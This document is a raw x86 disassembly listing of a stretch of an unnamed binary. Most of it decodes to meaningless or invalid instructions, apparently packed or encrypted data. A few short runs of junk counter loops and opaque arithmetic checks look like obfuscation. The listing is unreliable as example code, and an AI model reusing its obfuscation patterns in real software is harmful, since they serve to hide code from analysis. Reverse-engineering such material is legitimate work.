  405176:	sbb    bh,BYTE PTR [edi+edx*8+0x6]
  40517a:	cmp    esi,ecx
  40517c:	add    al,0x83
  40517e:	clc    
  40517f:	aad    0x44
  405181:	fdivr  QWORD PTR [edx-0x55]
  405184:	adc    BYTE PTR [edx+0x4d35683d],cl
  40518a:	dec    edx
  40518b:	adc    eax,0xe908eae
  405190:	inc    ecx
  405191:	cmp    eax,0xc66788c2
  405196:	xor    ch,BYTE PTR [ebp+0x25]
  405199:	cmc    
  40519a:	and    DWORD PTR [esi+0x322d2813],ebx
  4051a0:	stos   BYTE PTR es:[edi],al
  4051a1:	enter  0x1c0f,0x7b
  4051a5:	mov    BYTE PTR [eax+0x28],ah
  4051a8:	push   cs
  4051a9:	sbb    bl,BYTE PTR [esp+ecx*2+0x55]
  4051ad:	mov    es,esi
  4051af:	ror    BYTE PTR [edi],0x54
  4051b2:	idiv   DWORD PTR [edx+ebx*4-0x5a]
  4051b6:	test   BYTE PTR [edx-0x12],cl
  4051b9:	retf   
  4051ba:	sti    
  4051bb:	hlt    
  4051bc:	imul   BYTE PTR [ebx+0xd]
  4051bf:	or     ebp,DWORD PTR [edx-0x13]
  4051c2:	inc    esi
  4051c3:	mul    DWORD PTR [edx]
  4051c5:	cmp    al,0xa5
  4051c7:	ss jno 0x4051f2
  4051ca:	out    dx,eax
  4051cb:	lods   al,BYTE PTR ds:[esi]
  4051cc:	cli    
  4051cd:	(bad)  
  4051ce:	outs   dx,DWORD PTR ds:[esi]
  4051cf:	in     eax,0x25
  4051d1:	sbb    DWORD PTR [esi+0x161c322d],0x95490e2
  4051db:	fild   WORD PTR [eax]
  4051dd:	test   DWORD PTR [edi],ebp
  4051df:	xor    al,0x72
  4051e1:	dec    edx
  4051e2:	stc    
  4051e3:	pop    ss
  4051e4:	jl     0x405177
  4051e6:	xlat   BYTE PTR ds:[ebx]
  4051e7:	ror    BYTE PTR [edi+0x62],1
  4051ea:	retf   0xa272
  4051ed:	cmp    dh,BYTE PTR [edx+edx*2+0x57]
  4051f1:	sub    DWORD PTR [edi],0x7a70d6f1
  4051f7:	faddp  st(5),st
  4051f9:	rol    edx,cl
  4051fb:	stos   DWORD PTR es:[edi],eax
  4051fc:	fs (bad) 
  4051fe:	(bad)  
  4051ff:	mov    ecx,esi
  405201:	lock daa 
  405203:	and    ebx,DWORD PTR [edi-0x591d93eb]
  405209:	shl    DWORD PTR [esi-0x42],cl
  40520c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40520d:	and    al,0x28
  40520f:	fs dec edx
  405211:	dec    esp
  405212:	cmp    eax,DWORD PTR [esi]
  405214:	das    
  405215:	mov    esp,0xb777e678
  40521a:	push   es
  40521b:	adc    ah,al
  40521d:	mov    bh,0xe8
  40521f:	push   edi
  405220:	sub    DWORD PTR [edi],ebp
  405222:	sub    bl,BYTE PTR [edi+0x6cebf683]
  405228:	cwde   
  405229:	add    BYTE PTR [esi+0x44c17fdb],ah
  40522f:	out    dx,eax
  405230:	jno    0x4051fd
  405232:	jne    0x405284
  405234:	call   0x4b5f71ff
  405239:	outs   dx,DWORD PTR ds:[esi]
  40523a:	mov    WORD PTR [ebp+eax*4+0x4c84dcc9],ss
  405241:	gs and al,0x3f
  405244:	in     eax,0xdb
  405246:	push   ss
  405247:	imul   BYTE PTR [ebx+0x6f5620a9]
  40524d:	mov    BYTE PTR [eax],al
  40524f:	or     al,0x3d
  405251:	pop    ds
  405252:	popa   
  405253:	retf   
  405254:	xor    BYTE PTR [eax-0x3d481695],bh
  40525a:	adc    eax,0xf5305471
  40525f:	into   
  405260:	add    al,0x34
  405262:	push   ebp
  405263:	xor    DWORD PTR [ebx-0x53],ebp
  405266:	adc    BYTE PTR [ebp-0x55003622],al
  40526c:	mov    BYTE PTR [edi-0x26],dh
  40526f:	pushf  
  405270:	mov    al,ds:0x3982b25a
  405275:	loop   0x405249
  405277:	shl    BYTE PTR [ebx+edx*2],0xe
  40527b:	jb     0x405269
  40527d:	das    
  40527e:	aam    0x33
  405280:	adc    al,0x21
  405282:	outs   dx,BYTE PTR cs:[esi]
  405284:	add    DWORD PTR ds:0x7e399a64,0x7b
  40528b:	pop    ebx
  40528c:	test   DWORD PTR [ebp-0x3ae35b7f],0x34d11982
  405296:	sbb    ebp,DWORD PTR [edx+0x46]
  405299:	add    ecx,DWORD PTR [eax]
  40529b:	sbb    al,0x5d
  40529d:	addr16 (bad) 
  4052a0:	jmp    0xf25:0xb7959077
  4052a7:	scas   eax,DWORD PTR es:[edi]
  4052a8:	xlat   BYTE PTR ds:[ebx]
  4052a9:	mov    edi,DWORD PTR [ebp-0x18]
  4052ac:	xor    edi,eax
  4052ae:	add    edx,edi
  4052b0:	mov    edi,DWORD PTR [ebp-0x8]
  4052b3:	lea    edx,[edx+edi*1+0x32729d]
  4052ba:	mov    DWORD PTR [ebp-0x8],edx
  4052bd:	mov    edx,DWORD PTR [ebp-0x20]
  4052c0:	xor    edx,eax
  4052c2:	mov    edi,0xffcd8d63
  4052c7:	sub    edi,edx
  4052c9:	add    edi,DWORD PTR [ebp-0x10]
  4052cc:	mov    edx,DWORD PTR [ebp-0x20]
  4052cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4052d2:	xor    edx,eax
  4052d4:	add    edx,ecx
  4052d6:	imul   edx,ebx
  4052d9:	cmp    edx,edi
  4052db:	jbe    0x403ae8
  4052e1:	pop    ebx
  4052e2:	pop    edi
  4052e3:	leave  
  4052e4:	ret    0x8
  4052e7:	push   ebp
  4052e8:	mov    ebp,esp
  4052ea:	push   ecx
  4052eb:	and    DWORD PTR ds:0x430526,0x0
  4052f5:	jmp    0x405305
  4052fa:	mov    eax,ds:0x430526
  4052ff:	inc    eax
  405300:	mov    ds:0x430526,eax
  405305:	cmp    DWORD PTR ds:0x430526,0x18
  40530c:	jae    0x40536e
  405312:	cmp    DWORD PTR ds:0x430526,0x4
  405319:	jne    0x40533f
  40531f:	push   0x7989
  405324:	push   0x6fea
  405329:	push   DWORD PTR [ebp-0x28]
  40532c:	push   0x5a2e
  405331:	push   DWORD PTR [ebp-0x24]
  405334:	push   0x2930
  405339:	call   DWORD PTR ds:0x42eb28
  40533f:	cmp    DWORD PTR ds:0x430526,0x3
  405346:	jne    0x405357
  40534c:	mov    eax,ds:0x430526
  405351:	inc    eax
  405352:	mov    ds:0x430526,eax
  405357:	jmp    0x4052fa
  40535c:	mov    eax,ds:0x43055a
  405361:	xor    edx,edx
  405363:	add    edx,DWORD PTR ds:0x4305ea
  405369:	sub    eax,edx
  40536b:	or     eax,DWORD PTR [eax+edx*1]
  40536e:	push   ecx
  40536f:	or     eax,DWORD PTR ds:0x430542
  405375:	mov    eax,0xf89c8535
  40537a:	sbb    DWORD PTR ds:0x430532,ecx
  405380:	mov    DWORD PTR [ebp-0x8],eax
  405383:	movzx  ecx,BYTE PTR ds:0x430526
  40538a:	add    DWORD PTR ds:0x42e7f2,ecx
  405390:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  405397:	and    DWORD PTR ds:0x43053e,0x0
  4053a1:	mov    ecx,DWORD PTR ds:0x43053e
  4053a7:	inc    ecx
  4053a8:	mov    DWORD PTR ds:0x43053e,ecx
  4053ae:	cmp    DWORD PTR ds:0x43053e,0x22
  4053b5:	jne    0x4053c9
  4053bb:	push   DWORD PTR [ebp-0x24]
  4053be:	push   0x8601
  4053c3:	call   DWORD PTR ds:0x42ec20
  4053c9:	cmp    DWORD PTR ds:0x43053e,0x12
  4053d0:	jb     0x4053a1
  4053d6:	and    DWORD PTR ds:0x42ee94,0x0
  4053e0:	mov    ecx,DWORD PTR ds:0x42ee94
  4053e6:	inc    ecx
  4053e7:	mov    DWORD PTR ds:0x42ee94,ecx
  4053ed:	cmp    DWORD PTR ds:0x42ee94,0x7
  4053f4:	jne    0x405405
  4053fa:	push   0x68cd
  4053ff:	call   DWORD PTR ds:0x42ea64
  405405:	cmp    DWORD PTR ds:0x42ee94,0x6
  40540c:	jne    0x40541f
  405412:	mov    ecx,DWORD PTR ds:0x42ee94
  405418:	inc    ecx
  405419:	mov    DWORD PTR ds:0x42ee94,ecx
  40541f:	cmp    DWORD PTR ds:0x42ee94,0x1d
  405426:	jb     0x4053e0
  40542c:	mov    edx,DWORD PTR [ebp-0x8]
  40542f:	push   esi
  405430:	mov    ecx,0x7510856
  405435:	xor    edx,ecx
  405437:	mov    esi,0x32729d
  40543c:	push   edi
  40543d:	mov    edi,DWORD PTR [ebp+0x10]
  405440:	add    edx,esi
  405442:	jmp    0x40581e
  405447:	sub    dl,BYTE PTR [edi+0x7c7d3afd]
  40544d:	in     eax,dx
  40544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544f:	ins    DWORD PTR es:[edi],dx
  405450:	ret    
  405451:	mov    ecx,0x4d4c709
  405456:	pop    ss
  405457:	shl    BYTE PTR [esi+edi*2],cl
  40545a:	jle    0x405419
  40545c:	jno    0x4054dc
  40545e:	jle    0x40544a
  405460:	stc    
  405461:	mov    edi,0xc1498aef
  405466:	xchg   edi,eax
  405467:	pop    esi
  405468:	sahf   
  405469:	retf   
  40546a:	push   ds
  40546b:	gs sahf 
  40546d:	shl    BYTE PTR [ecx],cl
  40546f:	enter  0x8cb0,0x5b
  405473:	jbe    0x4054f1
  405475:	mov    bh,0xa3
  405477:	pop    ebp
  405478:	rcl    bh,1
  40547a:	mov    ecx,0xea36bfd9
  40547f:	push   0x98f88228
  405484:	(bad)  
  405485:	mov    edi,0xf4d37177
  40548a:	(bad)  
  40548b:	outs   dx,BYTE PTR ds:[esi]
  40548c:	pushf  
  40548d:	addr16 out 0xd,al
  405490:	cli    
  405491:	cli    
  405492:	mov    ebx,fs
  405494:	and    eax,0xaa5e917e
  405499:	push   0x79
  40549b:	imul   edi,DWORD PTR [esi-0x20],0x54
  40549f:	bound  edi,QWORD PTR [ecx-0x727bd1f5]
  4054a5:	fistp  WORD PTR [esi]
  4054a7:	shr    DWORD PTR [ebp+0x4a801fa],0xae
  4054ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054af:	inc    edx
  4054b0:	or     eax,DWORD PTR [eax+eax*8]
  4054b3:	xor    ah,BYTE PTR [ebp+0x729e5b0]
  4054b9:	pop    edx
  4054ba:	cmp    edi,DWORD PTR ds:0x9b28b809
  4054c0:	mov    esp,0x5edd898b
  4054c5:	xchg   edx,eax
  4054c6:	mov    al,ds:0x473c438e
  4054cb:	lods   eax,DWORD PTR ds:[esi]
  4054cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054cd:	leave  
  4054ce:	lods   al,BYTE PTR ds:[esi]
  4054cf:	pop    ecx
  4054d0:	mov    ebp,DWORD PTR ds:0x813b6e9a
  4054d6:	jbe    0x4054f4
  4054d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054d9:	jnp    0x405558
  4054db:	sub    al,0xcd
  4054dd:	ins    BYTE PTR es:[edi],dx
  4054de:	pop    edi
  4054df:	jbe    0x40548d
  4054e1:	retf   
  4054e2:	call   0xca4a:0x3b7e3d7f
  4054e9:	mov    bh,0xf4
  4054eb:	push   ecx
  4054ec:	test   DWORD PTR [ebx],esi
  4054ee:	call   0x1aa42dc0
  4054f3:	into   
  4054f4:	or     al,0xdc
  4054f6:	test   BYTE PTR [ebp+ecx*4-0x29079131],cl
  4054fd:	lds    ebx,FWORD PTR es:[ebx-0x79]
  405501:	rcr    DWORD PTR [edi],cl
  405503:	(bad)  
  405504:	push   edx
  405505:	xchg   ecx,eax
  405506:	sahf   
  405507:	repz (bad) [esp+ebp*8+0x35]
  40550c:	retf   
  40550d:	jns    0x405540
  40550f:	push   eax
  405510:	call   0x26b:0x6bd37fae
  405517:	sbb    cl,ah
  405519:	mov    dh,0x7f
  40551b:	mov    eax,ds:0x4ba1f98d
  405520:	jl     0x40557a
  405522:	xchg   esp,eax
  405523:	mov    edi,esi
  405525:	imul   eax,DWORD PTR [eax],0x753f8132
  40552b:	and    DWORD PTR [ebx+0x4b],ebp
  40552e:	mov    dl,0x72
  405530:	fbld   TBYTE PTR [edi]
  405532:	mov    cs,WORD PTR [esi]
  405534:	and    eax,edx
  405536:	pop    edi
  405537:	mov    ecx,0x82a9712a
  40553c:	cmp    esp,DWORD PTR [ebx-0x71]
  40553f:	fist   WORD PTR [edx-0x52]
  405542:	ror    BYTE PTR [esp+esi*2-0x6bc2a6bb],1
  405549:	ss jo  0x405514
  40554c:	fwait
  40554d:	icebp  
  40554e:	dec    ebx
  40554f:	fcomp  DWORD PTR [ecx+0x42]
  405552:	or     BYTE PTR [edi-0x72],dl
  405555:	aas    
  405556:	push   edx
  405557:	cmp    al,0x7a
  405559:	mov    ds:0x2b412c66,al
  40555e:	js     0x405569
  405560:	rol    DWORD PTR [eax+0x48],cl
  405563:	dec    ecx
  405564:	arpl   WORD PTR [esp+ebp*2],si
  405567:	pop    edx
  405568:	bndstx [ecx-0x2c],(bad)
  40556c:	jae    0x4055e4
  40556e:	dec    edx
  40556f:	mov    cl,0x3f
  405571:	lods   al,BYTE PTR ds:[esi]
  405572:	push   ebp
  405573:	(bad)  ds:0xeda0466a
  405579:	push   ecx
  40557a:	je     0x4055dc
  40557c:	loope  0x40557f
  40557e:	inc    edi
  40557f:	sub    BYTE PTR [ebx+eiz*4-0x10],bl
  405583:	xlat   BYTE PTR ds:[ebx]
  405584:	jo     0x40554f
  405586:	xor    edi,edi
  405588:	mov    eax,ds:0x888054ff
  40558d:	ins    BYTE PTR es:[edi],dx
  40558e:	pop    ss
  40558f:	jecxz  0x405539
  405591:	pop    edi
  405592:	in     eax,dx
  405593:	sub    esi,edx
  405595:	and    eax,0x482845fc
  40559a:	ficom  WORD PTR [eax-0x13]
  40559d:	pop    edi
  40559e:	dec    esp
  40559f:	out    0xda,eax
  4055a1:	mov    bl,0x9c
  4055a3:	fucomp st(0)
  4055a5:	dec    esi
  4055a6:	imul   ebp,DWORD PTR [edx-0x2d2a3c6d],0x1721cfa4
  4055b0:	mov    DWORD PTR [edi+0x7a],esi
  4055b3:	sti    
  4055b4:	clc    
  4055b5:	mov    esp,0x18dc9e7b
  4055ba:	ja     0x405637
  4055bc:	dec    BYTE PTR [esi+0xce7e15d]
  4055c2:	xor    DWORD PTR [ebp+0x30c59577],ebx
  4055c8:	xor    bl,BYTE PTR [edi]
  4055ca:	add    DWORD PTR [esi+0x7d52ac1e],0x7
  4055d1:	push   ebx
  4055d2:	test   al,0x56
  4055d4:	or     al,0xfc
  4055d6:	ins    BYTE PTR es:[edi],dx
  4055d7:	cmp    al,0x5b
  4055d9:	sub    DWORD PTR [edi+0xa],edx
  4055dc:	gs fs mov ebp,0x7ac76c7b
  4055e3:	inc    esi
  4055e4:	push   cs
  4055e5:	inc    edi
  4055e6:	mov    ch,0x4d
  4055e8:	arpl   WORD PTR [ecx-0x746cf475],bx
  4055ee:	cmp    eax,0x481906b3
  4055f3:	call   0xe17:0x6f32ab4e
  4055fa:	(bad)
  4055fd:	popf   
  4055fe:	cmp    dh,BYTE PTR [esi]
  405600:	lods   eax,DWORD PTR ds:[esi]
  405601:	retf   0x12be
  405604:	dec    esp
  405605:	pop    es
  405606:	push   ss
  405607:	test   esp,edi
  405609:	gs and eax,0x2d03d5a6
  40560f:	(bad)
  405613:	fprem  
  405615:	pop    edi
  405616:	(bad)  
  405617:	ds jle 0x4055d7
  40561a:	push   ebx
  40561b:	mov    cl,0x1c
  40561d:	push   ebx
  40561e:	aas    
  40561f:	jb     0x405613
  405621:	frstor [ecx]
  405623:	mov    ds:0x8810a8f0,eax
  405628:	xchg   edi,eax
  405629:	mov    bh,0x44
  40562b:	mov    cl,0x9c
  40562d:	dec    edx
  40562e:	xchg   edi,esi
  405630:	jnp    0x4055ce
  405632:	cmp    al,0x70
  405634:	jno    0x4056ac
  405636:	js     0x4055fd
  405638:	pcmpgtw mm7,QWORD PTR [eax+esi*8]
  40563c:	sahf   
  40563d:	sub    ch,dl
  40563f:	add    BYTE PTR [esi-0x5c3f5beb],dh
  405645:	jle    0x405641
  405647:	inc    edx
  405648:	and    eax,0x79dc6adf
  40564d:	sar    ah,1
  40564f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405650:	hlt    
  405651:	icebp  
  405652:	loope  0x4056b5
  405654:	aas    
  405655:	stos   BYTE PTR es:[edi],al
  405656:	xor    al,0x53
  405658:	mov    al,0x7e
  40565a:	ret    0xa42
  40565d:	adc    al,0x8
  40565f:	mov    ds:0x1bc5462c,al
  405664:	inc    edx
  405665:	cmp    DWORD PTR [eax-0x5d6cce17],ebx
  40566b:	loope  0x405625
  40566d:	cs (bad) 
  40566f:	retf   0x7766
  405672:	fcom   st(0)
  405674:	mov    dh,0xa3
  405676:	mov    eax,ds:0xa295a737
  40567b:	lds    ebp,FWORD PTR [ebx-0x9]
  40567e:	and    al,0x4f
  405680:	ins    BYTE PTR es:[edi],dx
  405681:	cmovo  ebx,DWORD PTR [ecx-0x274bd4c9]
  405688:	mov    ecx,0xa8fb4dda
  40568d:	sahf   
  40568e:	or     BYTE PTR [edx+0x4453b0c9],cl
  405694:	mov    ebx,0x3e434b17
  405699:	fisubr WORD PTR [esp+esi*2]
  40569c:	mov    ebp,0xc85cff05
  4056a1:	addr16 int 0x27
  4056a4:	and    dh,BYTE PTR [edi-0x11ce44f2]
  4056aa:	jl     0x4056de
  4056ac:	sub    eax,0xd7072cb6
  4056b1:	dec    ebx
  4056b2:	test   al,0x8d
  4056b4:	xchg   BYTE PTR [eax+0x5c],ah
  4056b7:	mov    ebx,0xf85055b8
  4056bc:	mov    bh,BYTE PTR [edi]
  4056be:	xor    ebp,DWORD PTR ds:0xf2354ba1
  4056c4:	(bad)  
  4056c6:	dec    edx
  4056c7:	push   ecx
  4056c8:	jne    0x4056c1
  4056ca:	test   al,0x64
  4056cc:	dec    edx
  4056cd:	les    eax,FWORD PTR [ebp-0x2]
  4056d0:	outs   dx,DWORD PTR ds:[esi]
  4056d1:	std    
  4056d2:	ss mov dl,0xe8
  4056d5:	retf   0x449e
  4056d8:	out    dx,eax
  4056d9:	cmp    eax,0xe7686c42
  4056de:	or     eax,0x2a3d6bdb
  4056e3:	sub    BYTE PTR ds:0x99e2b516,ch
  4056e9:	push   ebp
  4056ea:	mov    es,WORD PTR [esi-0x64d167d3]
  4056f0:	cmp    eax,0x298b5a67
  4056f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056f6:	push   0xffffffe3
  4056f8:	sub    BYTE PTR ds:0x32ba788b,dl
  4056fe:	ror    DWORD PTR [edi+0x74],cl
  405701:	push   es
  405702:	xchg   ebx,eax
  405703:	fs xchg edi,eax
  405705:	outs   dx,DWORD PTR ds:[esi]
  405706:	add    BYTE PTR [esi+0x51c7fa25],0x9b
  40570d:	addr16 popa 
  40570f:	mov    bl,0x57
  405711:	lods   eax,DWORD PTR ds:[esi]
  405712:	cmp    ah,ch
  405714:	inc    ecx
  405715:	iret   
  405716:	fsubp  st(5),st
  405718:	push   ebp
  405719:	jg     0x405780
  40571b:	retf   
  40571c:	push   ebx
  40571d:	leave  
  40571e:	idiv   BYTE PTR [ebp+0x79]
  405721:	dec    edi
  405722:	call   0x87f0:0x9b61fb88
  405729:	retf   0xb8a2
  40572c:	inc    ebx
  40572d:	aad    0xbc
  40572f:	jae    0x405755
  405731:	leave  
  405732:	stos   BYTE PTR es:[edi],al
  405733:	stos   BYTE PTR es:[edi],al
  405734:	mov    DWORD PTR [eax-0x3a],esi
  405737:	xchg   DWORD PTR [eax+0x5f3e5294],esi
  40573d:	daa    
  40573e:	ror    DWORD PTR [ebp+0x26],0x66
  405742:	dec    edx
  405743:	pop    ebx
  405744:	not    dl
  405746:	cmp    al,0xc0
  405748:	mov    al,ds:0xd35d5e83
  40574d:	lods   al,BYTE PTR ds:[esi]
  40574e:	push   cs
  40574f:	mov    esp,?
  405751:	push   0x23
  405753:	leave  
  405754:	sub    eax,0x72c27703
  405759:	pop    ss
  40575a:	inc    ebx
  40575b:	xor    DWORD PTR [edx-0x24b0a73e],eax
  405761:	mov    edx,DWORD PTR [eax+0x38]
  405764:	je     0x405781
  405766:	fs mov edi,0x848437b1
  40576c:	pusha  
  40576d:	push   ebx
  40576e:	adc    al,0x68
  405770:	push   ecx
  405771:	push   cs
  405772:	aas    
  405773:	mov    cl,0x5b
  405775:	or     eax,0x881cccc9
  40577a:	imul   esp,DWORD PTR ds:0x3e25fa0c,0x17
  405781:	xor    ecx,esi
  405783:	in     al,0x47
  405785:	stos   BYTE PTR es:[edi],al
  405786:	scas   eax,DWORD PTR es:[edi]
  405787:	cmp    esi,esi
  405789:	mov    WORD PTR [ebx-0x140d55ae],?
  40578f:	xchg   DWORD PTR [ecx-0x33],esi
  405792:	pop    esi
  405793:	rcl    esp,cl
  405795:	push   es
  405796:	cmp    al,0xb3
  405798:	gs inc eax
  40579a:	mov    BYTE PTR [eax],bh
  40579c:	pop    bp
  40579e:	jge    0x405771
  4057a0:	mov    ebp,0xb96bdda3
  4057a5:	ficomp WORD PTR ds:0x139a30fa
  4057ab:	retf   
  4057ac:	mov    ah,0xc8
  4057ae:	or     al,0xba
  4057b0:	push   ss
  4057b1:	mov    ebx,0x23965b7f
  4057b6:	enter  0xb09b,0x62
  4057ba:	bound  eax,QWORD PTR [ecx+0xf259a8c]
  4057c0:	xchg   esi,eax
  4057c1:	sbb    eax,0xd33238be
  4057c6:	fbld   TBYTE PTR [ecx]
  4057c8:	gs xor ebx,edx
  4057cb:	sub    al,0xde
  4057cd:	mov    gs,WORD PTR [eax+0x7fda6834]
  4057d3:	or     al,0xd9
  4057d5:	lock shr BYTE PTR [eax+ecx*2],cl
  4057d9:	or     ecx,DWORD PTR [ecx+0x37]
  4057dc:	ds inc ebx
  4057de:	or     edi,edi
  4057e0:	stc    
  4057e1:	mov    DWORD PTR [esi+0x7d],ecx
  4057e4:	jp     0x4057eb
  4057e6:	mov    esp,0xb0760901
  4057eb:	sbb    edi,DWORD PTR [edx-0x7]
  4057ee:	int    0x2a
  4057f0:	test   BYTE PTR [esi+0x7c],dl
  4057f3:	cwde   
  4057f4:	push   0xed3f694d
  4057f9:	loop   0x405835
  4057fb:	add    ebp,0xffffffea
  4057fe:	popa   
  4057ff:	outs   dx,DWORD PTR ds:[esi]
  405800:	mov    edi,0xd569019f
  405805:	sub    DWORD PTR [edi+0x21e8b08c],0x3adb78cb
  40580f:	dec    ebp
  405810:	out    0x12,al
  405812:	xchg   ebp,eax
  405813:	jo     0x40580b
  405815:	std    
  405816:	outs   dx,DWORD PTR ds:[esi]
  405817:	stos   BYTE PTR es:[edi],al
  405818:	mov    dl,0x13
  40581a:	or     al,0xfa
  40581c:	or     dh,cl
  40581e:	cmp    edi,edx
  405820:	je     0x40642d
  405826:	mov    edx,DWORD PTR [ebp-0x8]
  405829:	mov    eax,DWORD PTR [ebp-0x4]
  40582c:	xor    eax,ecx
  40582e:	mov    edi,0xffcd8d63
  405833:	jmp    0x405c0f
  405838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405839:	loop   0x4058ae
  40583b:	fmul   DWORD PTR [ebx-0x7]
  40583e:	jge    0x4058a4
  405840:	xor    BYTE PTR [edx+ebx*8+0x60cd613c],bh
  405847:	fwait
  405848:	adc    DWORD PTR [eax],edi
  40584a:	jle    0x4058ca
  40584c:	mov    ebp,0xa27e7e71
  405851:	add    esp,DWORD PTR [edx+0x6403d687]
  405857:	retf   0xc55b
  40585a:	sti    
  40585b:	data16 and al,0xe
  40585e:	pop    eax
  40585f:	pop    edi
  405860:	xchg   edx,eax
  405861:	jns    0x40589b
  405863:	(bad)  
  405864:	les    ecx,FWORD PTR [ecx+0x4f]
  405867:	sbb    bl,0x7b
  40586a:	out    0x75,eax
  40586c:	or     ebp,DWORD PTR [esi]
  40586e:	sti    
  40586f:	push   0x45c5ab8b
  405874:	fsubp  st(6),st
  405876:	sub    eax,0xe37f257b
  40587b:	push   0xbf868c12
  405880:	fs in  al,0xf4
  405883:	imul   DWORD PTR [edi-0x27]
  405886:	and    ebx,eax
  405888:	push   ebx
  405889:	jne    0x4058d5
  40588b:	pop    edi
  40588c:	sub    eax,0x7efc0930
  405891:	ins    BYTE PTR es:[edi],dx
  405892:	jmp    0x48ff:0x2d343886
  405899:	inc    ebx
  40589a:	mov    ds:0xbb3b31df,al
  40589f:	xchg   esp,eax
  4058a0:	in     eax,dx
  4058a1:	(bad)  
  4058a3:	addps  xmm0,XMMWORD PTR [ecx+edx*4]
  4058a7:	mov    BYTE PTR [ebx+0x4fd6ac80],al
  4058ad:	jae    0x4058d4
  4058af:	dec    edx
  4058b0:	cdq    
  4058b1:	cld    
  4058b2:	test   al,0x52
  4058b4:	pusha  
  4058b5:	push   ss
  4058b6:	ds es mov dh,0x99
  4058bb:	inc    ebp
  4058bc:	test   al,0xae
  4058be:	adc    al,0xb5
  4058c0:	fneni(8087 only) 
  4058c2:	pop    ecx
  4058c3:	repnz addr16 push 0xf5dcb275
  4058ca:	jl     0x405855
  4058cc:	mov    ecx,0xc1a062aa
  4058d1:	jns    0x40587e
  4058d3:	arpl   WORD PTR [eax-0x340bfba2],sp
  4058d9:	sub    DWORD PTR [bx+di-0x52ff],ebp
  4058de:	or     al,0x1d
  4058e0:	shl    DWORD PTR [esi+eiz*8-0x24],0xeb
  4058e5:	sbb    BYTE PTR [edx],cl
  4058e7:	mov    ch,0x95
  4058e9:	dec    esp
  4058ea:	cli    
  4058eb:	add    DWORD PTR ds:0x5413e565,ebp
  4058f1:	adc    DWORD PTR [esi+eax*4],ebp
  4058f4:	mov    ebx,0xf89987cb
  4058f9:	xor    DWORD PTR [ecx-0x1c5f984b],esp
  4058ff:	and    al,0x1
  405901:	pop    edi
  405902:	and    al,bl
  405904:	(bad)  
  405905:	shl    DWORD PTR [edi+eax*4+0x13],cl
  405909:	ror    DWORD PTR [ebp+0x690a54a2],1
  40590f:	fcom   DWORD PTR [ebx+0x70]
  405912:	fild   WORD PTR [esi+0x6a3d3724]
  405918:	sub    esp,esp
  40591a:	cs stos BYTE PTR es:[edi],al
  40591c:	or     dh,dl
  40591e:	popf   
  40591f:	mov    ds,WORD PTR [eax]
  405921:	inc    ebp
  405922:	or     bl,al
  405924:	and    eax,DWORD PTR [edi+0x60c2a684]
  40592a:	jb     0x405987
  40592c:	pop    eax
  40592d:	and    DWORD PTR [ebx],esi
  40592f:	and    al,0x87
  405931:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  405933:	dec    eax
  405934:	inc    esi
  405935:	xor    cl,al
  405937:	call   0x1012:0x662af9cf
  40593e:	adc    bl,bh
  405940:	pop    edx
  405941:	sub    DWORD PTR [ebp+0x62],0x1c
  405945:	lods   al,BYTE PTR ds:[esi]
  405946:	push   edx
  405947:	jge    0x405998
  405949:	sbb    BYTE PTR [ecx],dh
  40594b:	add    BYTE PTR [ecx],0x23
  40594e:	cmp    BYTE PTR [ecx+ebx*2],al
  405951:	hlt    
  405952:	pop    edx
  405953:	outs   dx,BYTE PTR ds:[esi]
  405954:	in     eax,0x1e
  405956:	int3   
  405957:	adc    BYTE PTR [edi],cl
  405959:	dec    edx
  40595a:	or     BYTE PTR [ecx],al
  40595c:	add    esi,DWORD PTR [edx]
  40595e:	jl     0x4058e5
  405960:	pop    eax
  405961:	ret    0x207c
  405964:	idiv   DWORD PTR [esi+0x2b]
  405967:	mov    ds:0xeec2e621,al
  40596c:	jo     0x4059ec
  40596e:	sbb    ah,BYTE PTR [ebx-0x349fc9ee]
  405974:	push   0xaed7439a
  405979:	inc    ecx
  40597a:	sbb    edx,DWORD PTR [ebx-0x59b885d7]
  405980:	in     al,dx
  405981:	mov    BYTE PTR [edi],al
  405983:	push   esi
  405984:	sub    al,BYTE PTR [ecx-0x5a603994]
  40598a:	sbb    cl,BYTE PTR [ecx]
  40598c:	mov    WORD PTR [edi],?
  40598e:	mov    ebp,0x62bce91f
  405993:	jae    0x40597e
  405995:	jmp    0x7a8b5c27
  40599a:	jbe    0x405961
  40599c:	inc    ebx
  40599d:	das    
  40599e:	loop   0x40592f
  4059a0:	lahf   
  4059a1:	xor    al,0xd7
  4059a3:	mov    ah,BYTE PTR [edi+0x51]
  4059a6:	mov    ss,WORD PTR [ecx+0x34]
  4059a9:	aaa    
  4059aa:	js     0x4059be
  4059ac:	dec    edi
  4059ad:	mov    DWORD PTR [ecx-0x57],edi
  4059b0:	sbb    bh,BYTE PTR [esi]
  4059b2:	pop    ebp
  4059b3:	stc    
  4059b4:	and    BYTE PTR [esp+ebx*8+0x60],dh
  4059b8:	not    DWORD PTR [esi+0x6b820364]
  4059be:	sbb    DWORD PTR [esi],ebx
  4059c0:	cmp    al,0xaa
  4059c2:	ret    0x45b0
  4059c5:	cmp    DWORD PTR [edx],esi
  4059c7:	push   es
  4059c8:	test   BYTE PTR [edx-0x3a],bh
  4059cb:	jnp    0x4059f9
  4059cd:	push   es
  4059ce:	stc    
  4059cf:	enter  0x8e7,0x0
  4059d3:	dec    edi
  4059d4:	fdivr  DWORD PTR [ebx+0x2c8e1c5f]
  4059da:	xor    DWORD PTR [edi+0x27],esi
  4059dd:	retf   
  4059de:	clc    
  4059df:	adc    bh,bl
  4059e1:	cmp    dl,dh
  4059e3:	pop    es
  4059e4:	enter  0xb125,0x93
  4059e8:	test   DWORD PTR [edx+0x257a91d9],ebx
  4059ee:	xor    bl,bh
  4059f0:	(bad)  
  4059f2:	ror    BYTE PTR [esi+0x62],1
  4059f5:	cmp    DWORD PTR [edi+0x4a],ecx
  4059f8:	or     DWORD PTR [esi],ebx
  4059fa:	lods   al,BYTE PTR ds:[esi]
  4059fb:	nop
